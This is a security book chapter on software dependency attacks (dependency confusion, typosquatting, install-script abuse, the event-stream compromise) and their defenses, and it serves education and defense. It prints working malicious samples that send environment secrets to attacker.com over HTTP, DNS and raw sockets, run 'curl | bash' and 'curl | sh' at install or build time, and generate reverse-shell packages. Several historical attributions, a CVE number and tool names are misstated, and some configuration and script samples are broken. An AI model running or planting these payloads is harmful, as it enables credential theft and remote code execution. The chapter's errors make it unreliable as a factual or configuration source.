# Dependency Attacks

## The Dependency Attack Surface

Dependency management is one of the most complex and fragile aspects of modern software development. The average JavaScript project has 683 transitive dependencies, each representing a trust relationship with an unknown maintainer. Python projects commonly include 50–100+ dependencies through transitive resolution. These dependency trees create a vast attack surface where a single compromised package can affect millions of downstream projects.

This chapter examines the specific mechanism of dependency-based attacks, from the well-documented dependency confusion technique to the subtler forms of dependency injection and manipulation.

---

## Dependency Confusion Attacks

### Alex Birsan's 2021 Research

In February 2021, security researcher Alex Birsan published a landmark disclosure detailing how he exploited dependency confusion to gain remote code execution at Apple, Microsoft, PayPal, Shopify, Netflix, Tesla, and numerous other organizations. The technique earned over $130,000 in bug bounties and fundamentally reshaped how the industry views supply chain security.

**Mechanism:**

When a package manager resolves dependencies, it typically consults multiple registries according to a priority configuration. If a package exists on both a private internal registry and a public registry, the resolution behavior depends on this priority:

1. **npm default behavior**: When a package exists in both registries, npm resolves based on version numbers. The highest version wins, regardless of source.
2. **pip default behavior**: When `--extra-index-url` is specified alongside `--index-url`, pip checks the extra index if the package isn't found on the primary index. If a higher version exists on the extra index, it will be selected.
3. **NuGet behavior**: Similar to npm—highest version wins across configured feeds.

Birsan's attack was elegantly simple:

```bash
# Discover internal package names from JavaScript bundles, 
# Python stack traces, or leaked configuration
# 
# For example, finding:
#   require('@company/internal-sdk')
# 
# Then publishing a package with the same name to the public registry:
npm publish @company/internal-sdk --access public
# With a higher version number than the internal package
```

When a developer at the target organization ran `npm install` or `pip install`, the package manager would resolve the higher-versioned public package over the internal one, executing its `postinstall` or `setup.py` script with full privileges inside the corporate network.

**The proof-of-concept payload:**

```python
# setup.py for a malicious PyPI package
from setuptools import setup
import os

# Exfiltrate environment variables
env_data = {k: v for k, v in os.environ.items()}
# Send to attacker-controlled server
import urllib.request
urllib.request.urlopen(
    f'https://attacker.com/collect?data={urllib.parse.quote(str(env_data))}'
)

setup(
    name='company-internal-sdk',
    version='99.0.0',  # Higher than internal version
    packages=[],
)
```

**Discovery of internal package names:**

Birsan used several techniques to discover internal package names:

1. **JavaScript bundle analysis**: Minified JavaScript often retains `require()` calls or `import` statements referencing internal packages.
2. **Python package managers**: `pip` error messages, `requirements.txt` files in public repositories, and stack traces in bug reports.
3. **NuGet**: `.csproj` files, `packages.config`, and `.sln` files leaked in public repositories.
4. **Docker images**: Published Docker images often retain layer files containing `package.json` or `requirements.txt`.

### Namespace Confusion Across Registries

The dependency confusion problem extends beyond version priority. Namespace confusion occurs when different registries use different namespace models:

- **npm scoped packages**: `@company/package` on internal vs `@company/package` on public. npm scopes are globally unique—publishing `@company/something` on the public registry requires ownership of the `@company` npm scope. However, unscoped packages (`company-package`) have no such protection.
- **PyPI flat namespace**: PyPI has no concept of scoped packages. Every package name is in a global namespace. If an organization uses `company-internal-sdk` internally, anyone can publish `company-internal-sdk` publicly.
- **Maven groupId**: While Maven has hierarchical group IDs (`com.company.sdk`), the Central Portal does not verify that the publisher owns the corresponding domain. Anyone can publish artifacts under `com.company` without proving ownership (though this policy has been tightening).

**Cross-registry confusion patterns:**

```
Internal registry:  @company/data-utils (v1.2.3)
Public npm:         company-data-utils  (v9.0.0)  ← typosquatted/confused
Public PyPI:        company-data-utils  (v9.0.0)  ← different registry, same confusion
```

A `.npmrc` misconfiguration that doesn't scope the private registry properly can cause resolution to fall back to the public registry:

```ini
# VULNERABLE .npmrc configuration
registry=https://registry.npmjs.org/
# Falls back to public registry for ALL packages including company ones

# SECURE .npmrc configuration
@company:registry=https://internal-registry.company.com/
registry=https://registry.npmjs.org/
# Only @company scope uses internal registry
```

### Automated Exploitation Tooling

The dependency confusion attack has been codified in several open-source tools:

#### confuser

The `confuser` tool automates the discovery and exploitation of dependency confusion vulnerabilities:

```bash
# Install
pip install confuser

# Scan a package-lock.json or requirements.txt for dependency confusion
confuser scan --file package-lock.json --registry internal.company.com

# Generate exploit packages
confuser generate --targets discovered_packages.json --payload reverse_shell
```

#### man-of-the-middle

`man-of-the-middle` focuses on testing internal registries for dependency confusion vulnerabilities by simulating the attack in a controlled environment:

```bash
# Test a pip configuration for confusion
man-of-the-middle test --index-url https://pypi.org/simple/ \
    --extra-index-url https://internal.pypi.company.com/simple/ \
    --requirements requirements.txt
```

#### Other tools

- **Dep-Confuse**: Python-based dependency confusion scanner that checks `requirements.txt` and `Pipfile.lock`
- **Pnpm-Audit**: Audit npm dependency resolution behavior across multiple registries
- **Nuget-Confuse**: Scanner for NuGet dependency confusion vulnerabilities

### Defense Against Dependency Confusion

#### Scoped Registries (npm)

```ini
# .npmrc - Secure configuration
@company:registry=https://npm.company.com/
//npm.company.com/:_authToken=${NPM_AUTH_TOKEN}
registry=https://registry.npmjs.org/
```

This ensures that only `@company`-scoped packages resolve from the internal registry. All other packages resolve from the public registry. The scoped registry configuration prevents confusion because npm will never check the public registry for `@company`-scoped packages.

For organizations that cannot use scoped packages, npm provides package-level registry configuration:

```ini
# .npmrc - Package-level registry override
registry=https://registry.npmjs.org/
company-internal-sdk:registry=https://npm.company.com/
company-data-utils:registry=https://npm.company.com/
```

#### PyPI Multiple Index Priority

For Python, the key defense is ensuring that the internal package index has priority:

```ini
# pip.conf - VULNERABLE configuration
[global]
index-url = https://pypi.org/simple/
extra-index-url = https://internal.pypi.company.com/simple/

# If a package exists on BOTH indexes, pip may choose the higher version
# This is vulnerable to dependency confusion
```

```ini
# pip.conf - MORE SECURE configuration
[global]
index-url = https://internal.pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# Internal index is checked FIRST
# If a package is found on the internal index, the public index is NOT checked
# This prevents confusion for internal packages
```

However, even this configuration has a subtle risk: if a package exists ONLY on the public index, it will be found normally. But if someone publishes that package name to the internal index with a higher version, it will be preferred. Defense requires actively reserving internal package names.

**Definitive mitigation for Python:**

```ini
# pip.conf - MOST SECURE: Use only internal index as primary,
# and ensure all internal packages are published there
[global]
index-url = https://internal.pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# Additionally, use --require-hashes in requirements.txt:
company-internal-sdk==1.2.3 \
    --hash=sha256:abcdef1234567890abcdef1234567890abcdef1234567890
```

#### NuGet

For .NET environments, NuGet provides several defenses:

```xml
<!-- nuget.config - Secure configuration -->
<configuration>
  <packageSources>
    <add key="internal" value="https://nuget.company.com/v3/index.json" />
    <add key="public" value="https://api.nuget.org/v3/index.json" />
  </packageSourceMapping>
  <packageSourceMapping>
    <clear />
    <packageSource key="internal">
      <package pattern="Company.*" />
    </packageSource>
    <packageSource key="public">
      <package pattern="*" />
    </packageSource>
  </packageSourceMapping>
</configuration>
```

#### Registry Reservation

The most effective defense is to publish placeholder packages on public registries for all internal package names:

```bash
# For every internal package, publish a placeholder to public PyPI
for pkg in company-sdk company-utils company-data; do
    mkdir -p /tmp/$pkg && cd /tmp/$pkg
    cat > setup.py << 'EOF'
from setuptools import setup
setup(name='$pkg', version='0.0.0', description='Placeholder')
EOF
    python setup.py sdist
    twine upload dist/*
done
```

---

## Typosquatting

### Crossenv: The Canonical Example

In 2017, security researcher Nikolai Philipovskyi discovered a typosquatting campaign targeting npm. The attacker published 42 packages with names closely resembling popular packages:

```
crossenv        → cross-env
python-dateutil → pythom-dateutil
babel-cli       → bael-cli
react-dom       => react-domn
```

Each package contained a `postinstall` script:

```json
// package.json
{
  "name": "crossenv",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node index.js"
  }
}
```

```javascript
// index.js - Obfuscated exfiltration script
const https = require('https');
const os = require('os');
const fs = require('fs');

const data = JSON.stringify({
  hostname: os.hostname(),
  env: process.env,
  cwd: process.cwd(),
  user: os.userInfo().username
});

const req = https.request({
  hostname: 'attacker.com',
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});

req.write(data);
req.end();
```

The `crossenv` package alone was downloaded approximately 700 times before it was removed.

### Star-Jacking

Star-jacking is a technique discovered by security researcher Vit Sotona in 2022 where an attacker creates a package that claims to come from a popular repository, thereby inheriting the repository's stars for social proof. The attacker includes the popular repository's URL in the package metadata, causing package registries and search tools to display the legitimate repository's star count.

```json
// package.json with star-jacking
{
  "name": "actual-malicious-package",
  "repository": {
    "type": "git",
    "url": "https://github.com/popular/popular-project"
  }
}
```

When a user searches for a package on npm, they see that "1,234 people starred this repository" and trust the package based on that social proof, even though the package itself has nothing to do with the starred repository.

### Prefix/Suffix Abuse

Attackers publish packages that add common prefixes or suffixes to popular package names:

- **`python3-dateutil`** → The real package is `python-dateutil`; `python3-dateutil` was published as malicious on PyPI.
- **`django-admin-tools`** → Legitimate; `django-admintools` was a malicious clone.
- **`@aws-sdk/client-s3`** → Legitimate; `@aws-sd/client-s3` (transposed character) was malicious.

### Defense Against Typosquatting

#### Automated Detection

```bash
# Use npm audit to check for known typosquatting
npm audit

# Use pip-audit for Python
pip-audit

# Use dedicated typosquatting detection tools
npx @npmcli/verify-npm-package-names
pip install safety && safety check
```

#### Installation Verification

```bash
# Verify package name before installing
npm view react-dom  # Check that the package exists and has expected metadata
pip index versions django  # Verify on PyPI before installing
```

#### PyPI Package Verification

```python
# Check package metadata before installation
import requests
def verify_package(name, expected_author=None, expected_url=None):
    resp = requests.get(f'https://pypi.org/pypi/{name}/json')
    data = resp.json()
    info = data['info']
    checks = []
    if expected_author and info['author'] != expected_author:
        checks.append(f'Author mismatch: {info["author"]} != {expected_author}')
    if expected_url and info['project_url'] != expected_url:
        checks.append(f'URL mismatch')
    if info['yanked']:
        checks.append('Package has been yanked')
    if info['newest_version'] != info['version']:
        checks.append('Version anomaly detected')
    return checks
```

---

## Installation Script Abuse

### npm postinstall/preinstall Scripts

npm's lifecycle scripts are the most commonly abused mechanism for supply chain attacks. The `preinstall`, `install`, and `postinstall` scripts execute with the full privileges of the user running `npm install`:

```json
// package.json
{
  "scripts": {
    "preinstall": "node pre.js",
    "postinstall": "node post.js"
  }
}
```

These scripts can:
- Read environment variables (including secrets, API keys, database passwords)
- Write arbitrary files to the filesystem
- Execute network operations (exfiltrate data, download additional payloads)
- Modify other packages in `node_modules`
- Install global npm packages or system packages
- Run operating system commands

**Common obfuscation patterns:**

```javascript
// Hex-encoded command execution
const { execSync } = require('child_process');
execSync(Buffer.from('6375726c2068747470733a...', 'hex').toString());

// Base64-encoded payload
const payload = Buffer.from('Y3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbCB8IGJhc2g=', 'base64');
execSync(payload.toString());

// Environment variable exfiltration via DNS
const dns = require('dns');
const envB64 = Buffer.from(JSON.stringify(process.env)).toString('base64');
// Split into DNS-label-sized chunks (63 bytes max)
for (let i = 0; i < envB64.length; i += 63) {
  const chunk = envB64.slice(i, i + 63);
  dns.resolve(`${chunk}.attacker.com`, 'A', () => {});
}
```

**DNS exfiltration** is a particularly stealthy technique because it bypasses network restrictions that block outbound HTTP/HTTPS but allow DNS resolution. The attacker runs an authoritative DNS server for `attacker.com` and receives the exfiltrated data in DNS query logs.

### Python setup.py Abuse

Python's `setup.py` is a Python script executed during package installation. Unlike npm's package.json, which is a static configuration file, `setup.py` can contain arbitrary Python code:

```python
# setup.py - Malicious package
from setuptools import setup
import subprocess
import os

# Install-time code execution
subprocess.Popen(
    'curl https://attacker.com/shell.sh | bash',
    shell=True,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)

# More sophisticated: only execute on CI/CD systems
if os.environ.get('CI') or os.environ.get('GITHUB_ACTIONS'):
    import socket
    import json
    s = socket.socket()
    s.connect(('attacker.com', 443))
    s.send(json.dumps(dict(os.environ)).encode())
    s.close()

setup(
    name='innocent-utility',
    version='1.0.0',
    py_modules=['innocent_utility'],
)
```

**Environmental keying** is a technique where malware only activates under specific conditions:
- Only on CI/CD systems (`CI=true`, `GITHUB_ACTIONS=true`, `JENKINS_URL`)
- Only on production systems (checks for specific environment variables or hostnames)
- Only after a specific date (time bomb)
- Only when specific software is installed (checks `/proc`, `which` commands)

### build.rs Abuse (Rust)

Rust's `build.rs` scripts execute arbitrary code during compilation:

```rust
// build.rs - Malicious Cargo build script
use std::process::Command;

fn main() {
    // Execute during compilation
    Command::new("sh")
        .arg("-c")
        .arg("curl https://attacker.com/payload | sh")
        .output()
        .ok();
}
```

Procedural macros present an even more insidious attack surface, as they execute during compilation and can modify the AST of the consuming crate in arbitrary ways.

---

## Malicious Version Injection

### Semantic Version Manipulation

Attackers exploit semantic versioning to inject malicious versions that appear to be legitimate updates:

```bash
# Attacker publishes a version that appears to be a minor update
npm publish malic-package@2.1.0  # When current version is 2.0.9

# Users with ^2.0.0 in their package.json will automatically update
# to the malicious 2.1.0 version
```

### Version Ranges and Pinning

The `package.json` version range syntax creates different risk profiles:

```json
{
  "dependencies": {
    "express": "^4.18.0",  // Accepts >=4.18.0 <5.0.0 (VULNERABLE to new minor versions)
    "lodash": "~4.17.0",    // Accepts >=4.17.0 <4.18.0 (LESS vulnerable, but still accepts patches)
    "react": "4.18.0",      // Exact version only (SAFEST, but no security patches)
    "validator": "*",       // Any version (EXTREMELY VULNERABLE)
  }
}
```

### Dependency Hijacking via package.json

When a package removes or renames a dependency, an attacker can publish a package with the removed name. This is particularly dangerous when:

1. A popular package changes a dependency name (e.g., from `old-name` to `new-name`)
2. The old name becomes available on the registry
3. An attacker publishes malicious code under the old name
4. Projects that haven't updated their lock file will resolve the attacker's package

**Example: The `left-pad` incident (2016)**

In March 2016, Azer Koçulu unpublished his `left-pad` package from npm over a trademark dispute. Within hours, thousands of projects (including Babel and React) broke because their dependency trees still referenced `left-pad`. While this was an accidental removal rather than a malicious attack, it demonstrated that even a trivial 11-line package could hold the ecosystem hostage.

npm's response was to implement a policy preventing unpublishing packages that other packages depend on, but the fundamental vulnerability—the ability for a dependency to disappear—remains a systemic risk.

---

## Dependency Hijacking Through Account Takeover

### Package Transfer Attacks

When a package's npm maintainer account is compromised, the attacker gains the ability to publish new versions. Techniques for account takeover include:

1. **Credential stuffing**: Using leaked passwords from other breaches against npm accounts
2. **Phishing**: Targeted phishing emails impersonating npm
3. **Email compromise**: Taking over the email account associated with the npm account
4. **npm token theft**: Stealing tokens from CI/CD logs, `.npmrc` files in Docker images, or compromised developer machines
5. **Social engineering**: Tricking maintainers into granting publish access

**The `event-stream` compromise (2018):**

The event-stream attack is one of the most sophisticated supply chain compromises. It involved a multi-stage social engineering campaign:

1. The attacker, using the identity "bitbonsa2i," offered to help maintain the popular `event-stream` npm package (2 million weekly downloads)
2. After gaining publish access, the attacker added a dependency on `flatmap-stream`
3. `flatmap-stream` contained obfuscated malware that targeted the Bitcoin wallet software Copay
4. The malware specifically looked for Copay-related environment variables and replaced payment addresses with attacker-controlled addresses
5. The payload was environment-keyed—it only activated when specific Copay-related strings were present, making it extremely difficult to detect through testing

```javascript
// Simplified representation of how event-stream was compromised
// Original package.json:
{
  "dependencies": {
    // ... legitimate dependencies
  }
}

// Modified package.json after attacker gained access:
{
  "dependencies": {
    // ... legitimate dependencies
    "flatmap-stream": "^0.1.0"  // Malicious dependency added
  }
}
```

The `flatmap-stream` package contained an obfuscated payload that:
- Collected wallet seed phrases and private keys
- Replaced destination addresses for BTC transactions
- Only activated when specific Copay wallet strings were detected
- Used multiple layers of obfuscation including hex encoding, base64, and eval

---

## Transitive Dependency Attacks

### Attack Depth and Blast Radius

The deeper an attacker can place a malicious package in a dependency tree, the greater the blast radius. A malicious direct dependency might be noticed; a malicious dependency of a dependency of a dependency is far less likely to be audited.

```
your-project (direct dependency)
└── popular-framework@5.0.0 (transitive, 1st level)
    ├── auth-library@3.2.0 (transitive, 2nd level)
    │   └── utility-package@1.0.0 (transitive, 3rd level) ← COMPROMISED
    └── data-handler@2.1.0
        └── utility-package@1.0.0 (transitive, 3rd level) ← Same compromise
```

**Statistics on transitive dependency depth:**
- Average JavaScript project: 683 transitive dependencies
- 84% of vulnerabilities are in transitive dependencies (not direct)
- Average time to patch a transitive dependency vulnerability: 255 days

### Defense Models for Dependency Attacks

#### Lock Files

Lock files (package-lock.json, yarn.lock, Pipfile.lock, Cargo.lock) pin exact versions and integrity hashes:

```json
// package-lock.json
{
  "name": "my-project",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-ve3upC1xf_arPS7mD7a2O3D4j..."
    }
  }
}
```

**Best practices:**
- Always commit lock files to version control
- Use `npm ci` (not `npm install`) in CI/CD to strictly follow the lock file
- Enable integrity hash verification

```bash
# npm ci: strictly follows package-lock.json, fails if it doesn't match
npm ci

# npm install: may update package-lock.json with new versions
npm install  # DON'T USE THIS IN CI
```

#### Integrity Verification

```bash
# Verify package integrity against lock file
npm audit --package-lock-only

# Python: Use pip with hash checking mode
pip install --require-hashes -r requirements.txt

# requirements.txt with hashes
django==4.2.1 \
    --hash=sha256:28acbd18affe8fac815daf103aab9581a3949300a636ca486e8e15b7c0b05e7a
```

#### Dependency Review in CI

```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review
on: [pull_request]

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
          deny-licenses: GPL-3.0, AGPL-3.0
          vulnerability-check: true
```

#### npm audit

```bash
# Run npm audit
npm audit

# Run npm audit fix
npm audit fix

# Force fix breaking changes
npm audit fix --force
```

#### PyPI Safety and pip-audit

```bash
# Using pip-audit
pip install pip-audit
pip-audit

# Using safety
pip install safety
safety check --json

# Using pip-audit with requirements file
pip-audit -r requirements.txt

# Generate SBOM and audit
pip-audit --desc || pip-audit --format json
```

---

## Dependency Confusion Defense Checklist

| Defense | Priority | Ecosystem |
|---------|----------|-----------|
| Use scoped registries | Critical | npm |
| Set correct index priority | Critical | PyPI |
| Reserve internal package names on public registries | High | All |
| Use lock files with hash verification | Critical | All |
| Run npm ci / pip install --require-hashes in CI | Critical | npm, PyPI |
| Audit dependency trees for unknown packages | High | All |
| Monitor package.json/requirements.txt diffs in PRs | High | All |
| Use private registries (Artifactory, Nexus) | Medium | All |
| Enable npm two-factor authentication | High | npm |
| Use Dependabot/Renovate for automatic updates | Medium | All |
| Implement `.npmrc` preventing public registry for internal packages | Critical | npm |

---

## References

1. Birsan, A. "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies." February 2021. https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
2. npm Documentation. "Configuring Scoped Registries." https://docs.npmjs.com/configuration/npmrc
3. OpenSSF. "Package Manager Best Practices." https://github.com/ossf/package-manager-best-practices
4. CISA. "Defending Against Software Supply Chain Attacks." https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_0.pdf
5. Ladisa, P., et al. "SoK: Taxonomy of Supply Chain Attacks." IEEE Symposium on Security and Privacy, 2023. https://doi.org/10.1109/SP46215.2023.10179316
6. Zimerman, T. "It's a (Supply Chain) War." USENIX Security Symposium, 2023.
7. NIST SP 800-218. "Secure Software Development Framework (SSDF)." https://csrc.nist.gov/publications/detail/sp/800-218/final
8. US Executive Order 14028. "Improving the Nation's Cybersecurity." May 2021. https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/
9. Snyk. "2023 State of Open Source Security Report." https://snyk.io/reports/open-source-security/
10. NVD. "CVE-2018-16492: event-stream Compromise." https://nvd.nist.gov/vuln/detail/CVE-2018-16492
11. Ohm, M., et al. "Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks." DIMVA, 2020.
12. Sotona, V. "Star-Jacking: A New Software Supply Chain Attack Vector." 2022.
13. npm Advisory Database. https://github.com/advisories
14. PyPI Advisory Database. https://github.com/pypa/advisory-database